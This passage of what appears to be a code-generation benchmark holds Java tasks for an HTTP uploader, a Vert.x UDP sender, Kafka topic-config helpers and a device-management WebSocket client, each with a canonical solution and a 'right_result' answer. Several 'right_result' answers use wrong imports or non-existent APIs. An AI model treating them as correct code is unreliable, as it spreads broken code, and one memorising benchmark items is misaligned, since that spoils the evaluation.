    "Canonical_solution": "import java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.time.Duration;\n\npublic class RdioScannerHttpClient {\n\n    private HttpClient mHttpClient = HttpClient.newBuilder()\n        .version(HttpClient.Version.HTTP_2)\n        .followRedirects(HttpClient.Redirect.NORMAL)\n        .connectTimeout(Duration.ofSeconds(20))\n        .build();\n\n    public String testConnection(RdioScannerConfiguration configuration) {\n        RdioScannerBuilder bodyBuilder = new RdioScannerBuilder();\n        bodyBuilder.addPart(FormField.KEY, configuration.getApiKey())\n            .addPart(FormField.SYSTEM, configuration.getSystemID())\n            .addPart(FormField.TEST, 1);\n\n        HttpRequest request = HttpRequest.newBuilder()\n            .uri(URI.create(configuration.getHost()))\n            .header(HttpHeaders.CONTENT_TYPE, MULTIPART_FORM_DATA + \"; boundary=\" + bodyBuilder.getBoundary())\n            .header(HttpHeaders.USER_AGENT, \"sdrtrunk\")\n            .header(HttpHeaders.ACCEPT, \"*/*\")\n            .POST(bodyBuilder.build())\n            .build();\n\n        HttpResponse.BodyHandler<String> responseHandler = HttpResponse.BodyHandlers.ofString();\n\n        try {\n            HttpResponse<String> response = mHttpClient.send(request, responseHandler);\n            String responseBody = response.body();\n            return (responseBody != null ? responseBody : \"(no response)\") + \" Status Code:\" + response.statusCode();\n        }\n        catch(Exception e) {\n            return e.getLocalizedMessage();\n        }\n    }\n\n    public void sendAudioRecordingAsync(RdioScannerConfiguration config, RdioScannerBuilder bodyBuilder) {\n        HttpRequest fileRequest = HttpRequest.newBuilder()\n            .uri(URI.create(config.getHost()))\n            .header(HttpHeaders.CONTENT_TYPE, MULTIPART_FORM_DATA + \"; boundary=\" + bodyBuilder.getBoundary())\n            .header(HttpHeaders.USER_AGENT, \"sdrtrunk\")\n            .POST(bodyBuilder.build())\n            .build();\n\n        mHttpClient.sendAsync(fileRequest, HttpResponse.BodyHandlers.ofString())\n            .whenComplete((fileResponse, throwable1) -> {\n                if(throwable1 != null || fileResponse.statusCode() != 200) {\n                    if(throwable1 instanceof IOException || throwable1 instanceof CompletionException) {\n                        // Handle error cases\n                    }\n                }\n                else {\n                    // Handle successful response\n                }\n            });\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 17,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.time.Duration;\nimport java.util.concurrent.CompletableFuture;\n\npublic class RdioScannerHttpClient {\n    private final HttpClient mHttpClient;\n\n    public RdioScannerHttpClient() {\n        mHttpClient = HttpClient.newBuilder()\n                .version(HttpClient.Version.HTTP_2)\n                .connectTimeout(Duration.ofSeconds(20))\n                .followRedirects(HttpClient.Redirect.NORMAL)\n                .build();\n    }\n\n    public String testConnection(RdioScannerConfiguration configuration) {\n        try {\n            HttpRequest request = HttpRequest.newBuilder()\n                    .uri(URI.create(configuration.getTestUrl()))\n                    .header(\"Authorization\", \"Bearer \" + configuration.getApiKey())\n                    .header(\"System-ID\", configuration.getSystemId())\n                    .GET()\n                    .build();\n\n            HttpResponse<String> response = mHttpClient.send(request, HttpResponse.BodyHandlers.ofString());\n            return \"Status Code: \" + response.statusCode() + \", Body: \" + response.body();\n        } catch (IOException | InterruptedException e) {\n            return \"Error: \" + e.getMessage();\n        }\n    }\n\n    public void sendAudioRecordingAsync(RdioScannerConfiguration config, RdioScannerBuilder bodyBuilder) {\n        CompletableFuture<Void> future = new CompletableFuture<>();\n\n        try {\n            HttpRequest request = bodyBuilder.buildMultipartRequest(config);\n            mHttpClient.sendAsync(request, HttpResponse.BodyHandlers.ofString())\n                    .thenApply(HttpResponse::body)\n                    .thenAccept(responseBody -> {\n                        System.out.println(\"Upload successful. Response: \" + responseBody);\n                        future.complete(null);\n                    })\n                    .exceptionally(ex -> {\n                        System.err.println(\"Upload failed: \" + ex.getMessage());\n                        future.completeExceptionally(ex);\n                        return null;\n                    });\n        } catch (Exception e) {\n            System.err.println(\"Failed to initiate upload: \" + e.getMessage());\n            future.completeExceptionally(e);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 452,
    "Instruction": "Task Description: Create a Java class that implements UDP communication using Vert.x, allowing for the initialization of a UDP socket, sending UDP packets, and closing the socket.\n\nClass Description: The UdpSender class provides functionality for sending UDP packets using Vert.x's DatagramSocket. It supports socket configuration, packet transmission, and socket cleanup.\n\nAttributes:\n\nAttribute1: socket [DatagramSocket] - The Vert.x DatagramSocket instance used for UDP communication.\nAttribute2: vertx [Vertx] - The Vert.x instance used to create the DatagramSocket.\n\nMethods:\n\nMethod1: initialize(DatagramSocketOptions options) -> void - Initializes the UDP socket with the specified configuration options.\nMethod2: sendPacket(Buffer data, int port, String host, Handler<AsyncResult<Void>> resultHandler) -> void - Sends a UDP packet containing the specified data to the given host and port, with an optional handler to track the send operation's success or failure.\nMethod3: close(Handler<AsyncResult<Void>> closeHandler) -> void - Closes the UDP socket, with an optional handler to track the close operation's completion.",
    "Canonical_solution": "import io.vertx.core.*;\nimport io.vertx.core.buffer.Buffer;\nimport io.vertx.core.datagram.DatagramSocket;\nimport io.vertx.core.datagram.DatagramSocketOptions;\n\npublic class UdpSender {\n\n    private DatagramSocket socket;\n    private Vertx vertx;\n\n    public UdpSender(Vertx vertx) {\n        this.vertx = vertx;\n    }\n\n    public void initialize(DatagramSocketOptions options) {\n        socket = vertx.createDatagramSocket(options);\n    }\n\n    public void sendPacket(Buffer data, int port, String host, Handler<AsyncResult<Void>> resultHandler) {\n        socket.send(data, port, host).onComplete(resultHandler);\n    }\n\n    public void close(Handler<AsyncResult<Void>> closeHandler) {\n        if (socket != null) {\n            socket.close().onComplete(closeHandler);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 14,
    "right_result": "```java\nimport io.vertx.core.AbstractVerticle;\nimport io.vertx.core.Buffer;\nimport io.vertx.core.Vertx;\nimport io.vertx.core.datagram.DatagramSocket;\nimport io.vertx.core.datagram.DatagramSocketOptions;\nimport io.vertx.core.net.SocketAddress;\nimport io.vertx.core.AsyncResult;\nimport io.vertx.core.Handler;\n\npublic class UdpSender {\n\n  private DatagramSocket socket;\n  private Vertx vertx;\n\n  public void initialize(DatagramSocketOptions options) {\n    this.vertx = Vertx.vertx();\n    this.socket = vertx.createDatagramSocket(options);\n  }\n\n  public void sendPacket(Buffer data, int port, String host, Handler<AsyncResult<Void>> resultHandler) {\n    SocketAddress address = SocketAddress.inetSocketAddress(port, host);\n    socket.send(data, address, res -> {\n      if (res.succeeded()) {\n        resultHandler.handle(io.vertx.core.Future.succeededFuture());\n      } else {\n        resultHandler.handle(io.vertx.core.Future.failedFuture(res.cause()));\n      }\n    });\n  }\n\n  public void close(Handler<AsyncResult<Void>> closeHandler) {\n    socket.close(closeHandler);\n    vertx.close();\n  }\n}\n```"
  },
  {
    "Task_id": 454,
    "Instruction": "Task Description: Retrieve the configurations of specified Kafka topics using the Kafka AdminClient API.\n\nFunction Description: This function connects to a Kafka cluster using the provided bootstrap servers and retrieves the configurations for the specified topic names. It utilizes the Kafka AdminClient to describe the configurations and returns them as a map of ConfigResource to Config objects.\n\nInput: \n- bootstrapServers: [String] - Comma-separated list of host/port pairs to use for establishing the initial connection to the Kafka cluster.\n- topicNames: [String[]] - Array of topic names for which configurations need to be retrieved.\n\nOutput: \n- [Map<ConfigResource, Config>] - A map where keys are ConfigResource objects representing the topics, and values are Config objects containing the configuration entries for each topic. The operation will timeout after 3 seconds if the configuration retrieval is not completed.",
    "Canonical_solution": "import org.apache.kafka.clients.admin.AdminClient;\nimport org.apache.kafka.clients.admin.AdminClientConfig;\nimport org.apache.kafka.clients.admin.DescribeConfigsResult;\nimport org.apache.kafka.clients.admin.Config;\nimport org.apache.kafka.common.config.ConfigResource;\nimport java.util.Map;\nimport java.util.HashMap;\nimport java.util.Arrays;\nimport java.util.concurrent.TimeUnit;\n\npublic Map<ConfigResource, Config> getTopicConfigurations(String bootstrapServers, String[] topicNames) throws Exception {\n    Map<String, Object> adminClientConfig = new HashMap<>();\n    adminClientConfig.put(AdminClientConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapServers);\n    AdminClient adminClient = AdminClient.create(adminClientConfig);\n    \n    ConfigResource[] configResources = Arrays.stream(topicNames)\n        .map(topicName -> new ConfigResource(ConfigResource.Type.TOPIC, topicName))\n        .toArray(ConfigResource[]::new);\n        \n    DescribeConfigsResult describeConfigsResult = adminClient.describeConfigs(Arrays.asList(configResources));\n    return describeConfigsResult.all().get(3, TimeUnit.SECONDS);\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 36,
    "right_result": "```java\nimport org.apache.kafka.clients.admin.AdminClient;\nimport org.apache.kafka.clients.admin.AdminClientConfig;\nimport org.apache.kafka.clients.admin.Config;\nimport org.apache.kafka.clients.admin.ConfigResource;\nimport org.apache.kafka.common.KafkaFuture;\n\nimport java.util.ArrayList;\nimport java.util.Collection;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.Properties;\nimport java.util.concurrent.ExecutionException;\n\npublic class KafkaTopicConfigRetriever {\n\n    public static Map<ConfigResource, Config> getTopicConfigurations(String bootstrapServers, String[] topicNames) throws ExecutionException, InterruptedException {\n        Properties props = new Properties();\n        props.put(AdminClientConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapServers);\n\n        try (AdminClient adminClient = AdminClient.create(props)) {\n            Collection<ConfigResource> configResources = new ArrayList<>();\n            for (String topic : topicNames) {\n                ConfigResource configResource = new ConfigResource(ConfigResource.Type.TOPIC, topic);\n                configResources.add(configResource);\n            }\n\n            KafkaFuture<Map<ConfigResource, Config>> describeConfigsFuture = adminClient.describeConfigs(configResources).all();\n            return describeConfigsFuture.get();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 455,
    "Instruction": "Task Description: Write a function that retrieves the configuration details of specified Kafka topics using the Kafka AdminClient API.\n\nFunction Description: The function connects to a Kafka cluster using the provided bootstrap servers, then fetches and returns the configuration details for each specified topic name. It utilizes Kafka's AdminClient to describe topic configurations and returns them as a map of ConfigResource to Config objects.\n\nInput: \n- bootstrapServers: [String] - Comma-separated list of host:port pairs for establishing the initial connection to the Kafka cluster\n- topicNames: [String[]] - Array of topic names whose configurations need to be retrieved\n\nOutput: \n- Returns [Map<ConfigResource, Config>] - A map where keys are ConfigResource objects representing the topics, and values are Config objects containing the configuration details for each topic\n- Throws [Exception] - If there's any error during the configuration retrieval process or if the operation times out",
    "Canonical_solution": "import org.apache.kafka.clients.admin.AdminClient;\nimport org.apache.kafka.clients.admin.AdminClientConfig;\nimport org.apache.kafka.clients.admin.DescribeConfigsResult;\nimport org.apache.kafka.clients.admin.Config;\nimport org.apache.kafka.common.config.ConfigResource;\nimport java.util.Map;\nimport java.util.HashMap;\nimport java.util.Arrays;\nimport java.util.concurrent.TimeUnit;\n\npublic Map<ConfigResource, Config> getKafkaTopicConfigs(String bootstrapServers, String[] topicNames) throws Exception {\n    Map<String, Object> adminClientConfig = new HashMap<>();\n    adminClientConfig.put(AdminClientConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapServers);\n    AdminClient adminClient = AdminClient.create(adminClientConfig);\n    \n    ConfigResource[] configResources = Arrays.stream(topicNames)\n        .map(topicName -> new ConfigResource(ConfigResource.Type.TOPIC, topicName))\n        .toArray(ConfigResource[]::new);\n        \n    DescribeConfigsResult describeConfigsResult = adminClient.describeConfigs(Arrays.asList(configResources));\n    return describeConfigsResult.all().get(3, TimeUnit.SECONDS);\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 36,
    "right_result": "```java\nimport org.apache.kafka.clients.admin.AdminClient;\nimport org.apache.kafka.clients.admin.Config;\nimport org.apache.kafka.clients.admin.ConfigResource;\nimport org.apache.kafka.common.KafkaFuture;\n\nimport java.time.Duration;\nimport java.util.ArrayList;\nimport java.util.Collection;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.Properties;\n\npublic class KafkaTopicConfigFetcher {\n\n    public static Map<ConfigResource, Config> getTopicConfigurations(String bootstrapServers, String[] topicNames) throws Exception {\n        Properties props = new Properties();\n        props.put(\"bootstrap.servers\", bootstrapServers);\n\n        try (AdminClient adminClient = AdminClient.create(props)) {\n            Collection<ConfigResource> resources = new ArrayList<>();\n            for (String topic : topicNames) {\n                ConfigResource resource = new ConfigResource(ConfigResource.Type.TOPIC, topic);\n                resources.add(resource);\n            }\n\n            KafkaFuture<Map<ConfigResource, Config>> future = adminClient.describeConfigs(resources).all();\n\n            return future.get(Duration.ofSeconds(30));\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 456,
    "Instruction": "Task Description: Create a Java class that provides administrative operations for Kafka topics, including retrieving configurations for individual topics, multiple topics, and all topics in a Kafka cluster.\n\nClass Description: The KafkaAdminTopicConfigProvider class is designed to interact with Kafka's AdminClient to perform topic configuration operations. It provides methods to fetch topic configurations either for a single topic, a set of topics, or all topics in the cluster. The class handles timeouts and errors gracefully and converts Kafka Config objects into standard Java Properties objects.\n\nAttributes:\n- _clusterConfigs: [Properties] - Stores configuration properties for the Kafka cluster\n- _adminClient: [AdminClient] - The Kafka AdminClient instance used to perform administrative operations\n- DESCRIBE_CLUSTER_CONFIGS_TIMEOUT: [Duration] - Constant defining the timeout duration for describeConfigs operations (90 seconds)\n- LOG: [Logger] - Logger instance for logging debug and warning messages\n\nMethods:\n- topicConfigs: [String topic] -> [Properties] - Retrieves configuration properties for a single specified topic. Returns empty Properties if retrieval fails.\n- topicConfigs: [Set<String> topics] -> [Map<String, Properties>] - Retrieves configurations for multiple topics specified in the input set. Returns a map of topic names to their configurations.\n- allTopicConfigs: [] -> [Map<String, Properties>] - Retrieves configurations for all topics in the Kafka cluster. Returns an empty map if retrieval fails.\n- convertConfigToProperties: [Config config] -> [Properties] - Helper method that converts a Kafka Config object into a Java Properties object, filtering out null entries.",
    "Canonical_solution": "import java.time.Duration;\nimport java.util.Collections;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.Properties;\nimport java.util.Set;\nimport java.util.concurrent.ExecutionException;\nimport java.util.stream.Collectors;\nimport org.apache.kafka.clients.admin.AdminClient;\nimport org.apache.kafka.clients.admin.Config;\nimport org.apache.kafka.clients.admin.ConfigEntry;\nimport org.apache.kafka.common.KafkaFuture;\nimport org.apache.kafka.common.config.ConfigResource;\nimport org.apache.kafka.common.protocol.Errors;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class KafkaAdminTopicConfigProvider {\n  private static final Logger LOG = LoggerFactory.getLogger(KafkaAdminTopicConfigProvider.class);\n  public static final Duration DESCRIBE_CLUSTER_CONFIGS_TIMEOUT = Duration.ofSeconds(90);\n  protected Properties _clusterConfigs;\n  protected AdminClient _adminClient;\n\n  public Properties topicConfigs(String topic) {\n    Config topicConfig = null;\n    ConfigResource topicResource = new ConfigResource(ConfigResource.Type.TOPIC, topic);\n    try {\n      LOG.debug(\"Requesting details for topic '{}'\", topic);\n      topicConfig = _adminClient\n              .describeConfigs(Collections.singletonList(topicResource))\n              .all()\n              .get()\n              .get(topicResource);\n    } catch (ExecutionException ee) {\n      if (Errors.REQUEST_TIMED_OUT.exception().getClass() == ee.getCause().getClass()) {\n        LOG.warn(\"Failed to retrieve configuration for topic '{}' due to describeConfigs request time out.\", topic);\n      } else {\n        LOG.warn(\"Cannot retrieve configuration for topic '{}'.\", topic, ee);\n      }\n    } catch (InterruptedException ie) {\n      LOG.debug(\"Interrupted while getting configuration for topic '{}'.\", topic, ie);\n    }\n\n    if (topicConfig != null) {\n      return convertConfigToProperties(topicConfig);\n    } else {\n      LOG.warn(\"The configuration for topic '{}' could not be retrieved, returning empty Properties instance.\", topic);\n      return new Properties();\n    }\n  }\n\n  public Map<String, Properties> topicConfigs(Set<String> topics) {\n    Map<ConfigResource, KafkaFuture<Config>> topicConfigs;\n    topicConfigs = _adminClient.describeConfigs(\n            topics.stream().map(name -> new ConfigResource(ConfigResource.Type.TOPIC, name)).collect(Collectors.toList())\n    ).values();\n\n    Map<String, Properties> propsMap = new HashMap<>();\n    if (topicConfigs != null) {\n      for (Map.Entry<ConfigResource, KafkaFuture<Config>> entry : topicConfigs.entrySet()) {\n        try {\n          Config config = entry.getValue().get();\n          propsMap.put(entry.getKey().name(), convertConfigToProperties(config));\n        } catch (ExecutionException ee) {\n          if (Errors.REQUEST_TIMED_OUT.exception().getClass() == ee.getCause().getClass()) {\n            LOG.warn(\"Failed to retrieve config for topics due to describeConfigs request timing out.\");\n            break;\n          } else {\n            LOG.debug(\"Cannot retrieve config for topic {}.\", entry.getKey().name(), ee);\n          }\n        } catch (InterruptedException ie) {\n          LOG.debug(\"Interrupted while getting config for topic {}.\", entry.getKey().name(), ie);\n        }\n      }\n    }\n    return propsMap;\n  }\n\n  public Map<String, Properties> allTopicConfigs() {\n    LOG.debug(\"Requesting configurations for all topics\");\n    Set<String> topicNames = null;\n    try {\n      topicNames = _adminClient.listTopics().names().get();\n    } catch (InterruptedException | ExecutionException e) {\n      LOG.warn(\"Unable to obtain list of all topic names from the Kafka Cluster\");\n    }\n\n    if (topicNames == null) {\n      return Collections.emptyMap();\n    } else {\n      return topicConfigs(topicNames);\n    }\n  }\n\n  protected static Properties convertConfigToProperties(Config config) {\n    Properties props = new Properties();\n    for (ConfigEntry entry : config.entries()) {\n      if (entry.name() == null || entry.value() == null) {\n        continue;\n      }\n      props.put(entry.name(), entry.value());\n    }\n    return props;\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 35,
    "right_result": "```java\nimport org.apache.kafka.clients.admin.AdminClient;\nimport org.apache.kafka.clients.admin.AdminClientConfig;\nimport org.apache.kafka.clients.admin.Config;\nimport org.apache.kafka.clients.admin.DescribeConfigsResult;\nimport org.apache.kafka.common.config.ConfigResource;\nimport org.apache.kafka.common.KafkaFuture;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.time.Duration;\nimport java.util.*;\nimport java.util.concurrent.ExecutionException;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.TimeoutException;\nimport java.util.Properties;\n\npublic class KafkaAdminTopicConfigProvider {\n    private final Properties _clusterConfigs;\n    private final AdminClient _adminClient;\n    private static final Duration DESCRIBE_CLUSTER_CONFIGS_TIMEOUT = Duration.ofSeconds(90);\n    private static final Logger LOG = LoggerFactory.getLogger(KafkaAdminTopicConfigProvider.class);\n\n    public KafkaAdminTopicConfigProvider(Properties clusterConfigs) {\n        this._clusterConfigs = clusterConfigs;\n        Properties adminProps = new Properties();\n        adminProps.putAll(clusterConfigs);\n        this._adminClient = AdminClient.create(adminProps);\n    }\n\n    public Properties topicConfigs(String topic) {\n        try {\n            Map<ConfigResource, Collection<String>> resources = new HashMap<>();\n            ConfigResource resource = new ConfigResource(ConfigResource.Type.TOPIC, topic);\n            resources.put(resource, Arrays.asList(\"all\"));\n\n            DescribeConfigsResult result = _adminClient.describeConfigs(resources);\n            Map<ConfigResource, Config> configsMap = result.all().get(DESCRIBE_CLUSTER_CONFIGS_TIMEOUT.toMillis(), TimeUnit.MILLISECONDS);\n            if (configsMap.containsKey(resource)) {\n                return convertConfigToProperties(configsMap.get(resource));\n            }\n        } catch (InterruptedException | ExecutionException | TimeoutException e) {\n            LOG.warn(\"Failed to retrieve config for topic {}\", topic, e);\n        }\n        return new Properties();\n    }\n\n    public Map<String, Properties> topicConfigs(Set<String> topics) {\n        Map<String, Properties> result = new HashMap<>();\n        try {\n            Map<ConfigResource, Collection<String>> resources = new HashMap<>();\n            for (String topic : topics) {\n                ConfigResource resource = new ConfigResource(ConfigResource.Type.TOPIC, topic);\n                resources.put(resource, Arrays.asList(\"all\"));\n            }\n\n            DescribeConfigsResult describeResult = _adminClient.describeConfigs(resources);\n            Map<ConfigResource, Config> configsMap = describeResult.all().get(DESCRIBE_CLUSTER_CONFIGS_TIMEOUT.toMillis(), TimeUnit.MILLISECONDS);\n\n            for (Map.Entry<ConfigResource, Config> entry : configsMap.entrySet()) {\n                String topicName = entry.getKey().name();\n                result.put(topicName, convertConfigToProperties(entry.getValue()));\n            }\n        } catch (InterruptedException | ExecutionException | TimeoutException e) {\n            LOG.warn(\"Failed to retrieve configs for topics {}\", topics, e);\n        }\n        return result;\n    }\n\n    public Map<String, Properties> allTopicConfigs() {\n        try {\n            List<String> topics = listAllTopics(_adminClient);\n            if (topics.isEmpty()) {\n                return Collections.emptyMap();\n            }\n            return topicConfigs(new HashSet<>(topics));\n        } catch (Exception e) {\n            LOG.warn(\"Failed to retrieve all topic configurations\", e);\n            return Collections.emptyMap();\n        }\n    }\n\n    private List<String> listAllTopics(AdminClient adminClient) throws InterruptedException, ExecutionException {\n        return adminClient.listTopics().names().get();\n    }\n\n    private Properties convertConfigToProperties(Config config) {\n        Properties properties = new Properties();\n        for (Config.ConfigEntry entry : config.entries()) {\n            if (entry.value() != null) {\n                properties.setProperty(entry.name(), entry.value());\n            }\n        }\n        return properties;\n    }\n}\n```"
  },
  {
    "Task_id": 457,
    "Instruction": "Task Description: Implement a Kafka topic administration utility class that provides functionality to describe Kafka topics using the AdminClient API.\n\nClass Description: The `KafkaTopicAdmin` class is a utility class designed to interact with Apache Kafka's administrative API. It provides methods to perform administrative operations on Kafka topics, specifically focusing on describing topic configurations. The class handles connection management and timeout configurations for administrative operations.\n\nAttributes:\n- configs: [Map<String, Object>] - Configuration properties for connecting to the Kafka cluster (e.g., bootstrap servers, security settings)\n- operationTimeout: [int] - Timeout duration in seconds for administrative operations\n\nMethods:\n- describeTopics: [describeTopics](String... topicNames) -> Map<String, TopicDescription> - Describes the specified Kafka topics by returning their configurations including partition count, replication factor, and other metadata. Throws KafkaException for operation failures or interruptions.\n- createAdmin: [createAdmin]() -> Admin - Creates and returns an AdminClient instance using the configured properties. Protected method for internal use.\n- getAdminConfig: [getAdminConfig]() -> Map<String, Object> - Returns a copy of the admin client configuration. Protected method for internal use.\n\nThe class implements AutoCloseable behavior through the AdminClient resource management in the describeTopics method, ensuring proper cleanup of resources. It handles various failure scenarios including timeouts, execution exceptions, and thread interruptions by wrapping them in appropriate KafkaException instances.",
    "Canonical_solution": "import org.apache.kafka.clients.admin.Admin;\nimport org.apache.kafka.clients.admin.AdminClient;\nimport org.apache.kafka.clients.admin.AdminClientConfig;\nimport org.apache.kafka.clients.admin.DescribeTopicsResult;\nimport org.apache.kafka.clients.admin.TopicDescription;\nimport org.springframework.kafka.KafkaException;\n\nimport java.util.Arrays;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.concurrent.ExecutionException;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.TimeoutException;\n\npublic class KafkaTopicAdmin {\n\n    private final Map<String, Object> configs;\n    private final int operationTimeout;\n\n    public KafkaTopicAdmin(Map<String, Object> configs, int operationTimeout) {\n        this.configs = new HashMap<>(configs);\n        this.operationTimeout = operationTimeout;\n    }\n\n    public Map<String, TopicDescription> describeTopics(String... topicNames) {\n        try (Admin admin = createAdmin()) {\n            Map<String, TopicDescription> results = new HashMap<>();\n            DescribeTopicsResult topics = admin.describeTopics(Arrays.asList(topicNames));\n            try {\n                results.putAll(topics.allTopicNames().get(this.operationTimeout, TimeUnit.SECONDS));\n                return results;\n            }\n            catch (InterruptedException ie) {\n                Thread.currentThread().interrupt();\n                throw new KafkaException(\"Interrupted while getting topic descriptions\", ie);\n            }\n            catch (TimeoutException | ExecutionException ex) {\n                throw new KafkaException(\"Failed to obtain topic descriptions\", ex);\n            }\n        }\n    }\n\n    protected Admin createAdmin() {\n        return AdminClient.create(getAdminConfig());\n    }\n\n    protected Map<String, Object> getAdminConfig() {\n        final Map<String, Object> configs2 = new HashMap<>(this.configs);\n        return configs2;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 35,
    "right_result": "```java\nimport org.apache.kafka.clients.admin.*;\nimport org.apache.kafka.common.KafkaFuture;\nimport org.apache.kafka.common.config.SaslConfigs;\nimport org.apache.kafka.common.serialization.StringSerializer;\n\nimport java.time.Duration;\nimport java.util.*;\nimport java.util.concurrent.ExecutionException;\nimport java.util.concurrent.TimeUnit;\nimport java.util.stream.Collectors;\n\npublic class KafkaTopicAdmin implements AutoCloseable {\n    private final Map<String, Object> configs;\n    private final int operationTimeout;\n    private Admin adminClient;\n\n    public KafkaTopicAdmin(Map<String, Object> configs, int operationTimeout) {\n        this.configs = new HashMap<>(configs);\n        this.operationTimeout = operationTimeout;\n        this.adminClient = createAdmin();\n    }\n\n    public Map<String, TopicDescription> describeTopics(String... topicNames) {\n        DescribeTopicsResult result = adminClient.describeTopics(Arrays.asList(topicNames));\n        try {\n            Map<String, KafkaFuture<TopicDescription>> futures = result.topicNameValues();\n            return futures.entrySet().stream()\n                    .collect(Collectors.toMap(\n                            Map.Entry::getKey,\n                            entry -> {\n                                try {\n                                    return entry.getValue().get(operationTimeout, TimeUnit.SECONDS);\n                                } catch (InterruptedException | ExecutionException | TimeoutException e) {\n                                    throw new KafkaException(\"Failed to describe topic: \" + entry.getKey(), e);\n                                }\n                            }\n                    ));\n        } catch (KafkaException e) {\n            close();\n            throw e;\n        }\n    }\n\n    protected Admin createAdmin() {\n        return Admin.create(configs);\n    }\n\n    protected Map<String, Object> getAdminConfig() {\n        return new HashMap<>(configs);\n    }\n\n    @Override\n    public void close() {\n        if (adminClient != null) {\n            adminClient.close(Duration.ofSeconds(10));\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 458,
    "Instruction": "Task Description: Implement a WebSocket client class for handling device management operations in a cross-platform environment (Android/iOS), including device occupation, release, and various debug operations.\n\nClass Description: TransportClient is a WebSocket client implementation that handles communication with a device management server. It manages device resources, processes incoming commands, and coordinates debug sessions for both Android and iOS devices.\n\nAttributes:\n- Inherited from WebSocketClient: Basic WebSocket connection attributes (URI, connection state, etc.)\n- No additional attributes declared (uses inherited functionality)\n\nMethods:\n1. TransportClient(URI serverUri) -> void - Constructor that initializes the WebSocket client with the server URI.\n\n2. onOpen(ServerHandshake serverHandshake) -> void - Callback when WebSocket connection is established. Logs connection status.\n\n3. onMessage(String s) -> void - Handles incoming messages from server. Parses JSON messages and delegates to appropriate handler methods based on message type. Runs handlers in a thread pool.\n\n4. onClose(int i, String s, boolean b) -> void - Callback when connection closes. Handles cleanup and reconnection logic.\n\n5. onError(Exception e) -> void - Callback for connection errors. Logs error messages.\n\n6. handleOccupyMessage(JSONObject jsonObject) -> void - Processes device occupation requests. Locks device and initiates platform-specific debug setup.\n   - Input: JSONObject containing device info and debug parameters\n   - Output: None (side effects: device lock, debug session setup)\n\n7. handleAndroidOccupy(String udId, JSONObject jsonObject) -> void - Android-specific occupation handler. Starts debug session and required services.\n   - Input: \n     - udId: String - Device identifier\n     - jsonObject: JSONObject - Occupation parameters\n   - Output: None (side effects: Android debug session setup)\n\n8. handleIOSOccupy(String udId, JSONObject jsonObject) -> void - iOS-specific occupation handler. Starts debug session and required services.\n   - Input:\n     - udId: String - Device identifier\n     - jsonObject: JSONObject - Occupation parameters\n   - Output: None (side effects: iOS debug session setup)\n\n(Note: The class contains additional private handler methods for other message types that follow similar patterns to handleOccupyMessage, but they are not fully shown in the reference code. These would include handlers for release, debug steps, suite operations, etc.)",
    "Canonical_solution": "import com.alibaba.fastjson.JSON;\nimport com.alibaba.fastjson.JSONObject;\nimport org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.handshake.ServerHandshake;\nimport java.net.URI;\n\npublic class TransportClient extends WebSocketClient {\n\n    public TransportClient(URI serverUri) {\n        super(serverUri);\n    }\n\n    @Override\n    public void onOpen(ServerHandshake serverHandshake) {\n        log.info(\"Connected and auth...\");\n    }\n\n    @Override\n    public void onMessage(String s) {\n        JSONObject jsonObject = JSON.parseObject(s);\n        if (jsonObject.getString(\"msg\").equals(\"pong\")) {\n            return;\n        }\n        log.info(\"Agent <- Server message: {}\", jsonObject);\n        TransportWorker.cachedThreadPool.execute(() -> {\n            switch (jsonObject.getString(\"msg\")) {\n                case \"occupy\" -> handleOccupyMessage(jsonObject);\n                case \"release\" -> handleReleaseMessage(jsonObject);\n                case \"stopDebug\" -> handleStopDebugMessage(jsonObject);\n                case \"settings\" -> handleSettingsMessage(jsonObject);\n                case \"auth\" -> handleAuthMessage(jsonObject);\n                case \"shutdown\" -> AgentManagerTool.stop();\n                case \"reboot\" -> handleRebootMessage(jsonObject);\n                case \"heartBeat\" -> handleHeartBeatMessage();\n                case \"hub\" -> PHCTool.setPosition(jsonObject.getInteger(\"position\"), jsonObject.getString(\"type\"));\n                case \"runStep\" -> handleRunStepMessage(jsonObject);\n                case \"debugStep\" -> handleDebugStepMessage(jsonObject);\n                case \"suite\" -> handleSuiteMessage(jsonObject);\n                case \"forceStopSuite\" -> handleForceStopSuiteMessage(jsonObject);\n            }\n        });\n    }\n\n    @Override\n    public void onClose(int i, String s, boolean b) {\n        if (TransportWorker.isKeyAuth) {\n            log.info(\"Server disconnected. Retry in 10s...\");\n        }\n        if (TransportWorker.client == this) {\n            TransportWorker.client = null;\n        }\n    }\n\n    @Override\n    public void onError(Exception e) {\n        log.info(e.getMessage());\n    }\n\n    private void handleOccupyMessage(JSONObject jsonObject) {\n        String udId = jsonObject.getString(\"udId\");\n        String token = jsonObject.getString(\"token\");\n        int platform = jsonObject.getInteger(\"platform\");\n\n        boolean lockSuccess = false;\n        try {\n            lockSuccess = DevicesLockMap.lockByUdId(udId, 30L, TimeUnit.SECONDS);\n        } catch (InterruptedException e) {\n            log.info(\"Fail to get device lock, cause {}\", e.getMessage());\n        }\n        if (!lockSuccess) {\n            log.info(\"Fail to get device lock... please make sure device is not busy.\");\n            return;\n        }\n\n        